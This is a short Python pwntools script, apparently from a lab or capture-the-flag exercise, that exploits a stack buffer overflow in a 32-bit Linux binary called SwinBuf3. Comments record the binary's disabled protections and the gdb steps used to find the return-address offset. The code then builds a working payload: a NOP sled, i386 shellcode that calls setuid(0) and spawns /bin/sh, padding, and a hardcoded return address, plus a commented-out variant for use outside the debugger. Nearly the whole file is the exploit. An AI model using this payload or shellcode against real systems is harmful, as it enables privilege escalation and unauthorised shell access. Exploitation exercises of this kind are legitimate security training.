#!/usr/bin/python 
from pwn import *
context(arch = 'i386', os = 'linux')

#Step 1: what security does it have?
#gdb-peda$ checksec
#CANARY    : disabled
#FORTIFY   : disabled
#NX        : disabled
#PIE       : ENABLED
#RELRO     : Partial

# step 2: find offset to EIP and stack
# gdb SwinBuf3
# pattern_arg 400
# pattern_offset 'AA8A'
# find 'AA8A'
# 0xbffff200
# q

# step 3: use offset
nopsled = '\x90' * 64 
shellcode = (
'\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2' +
'\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89' +
'\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
)
padding = 'A' * (112 - 64 - 32 +1)
eip = p32(0xbffff220)
payload = nopsled + shellcode + padding + eip

#step 4: in gdb
print payload
'''
#step 5: outside
eip = p32(0xbffff280)
payload = nopsled + shellcode + padding + eip
print payload
'''
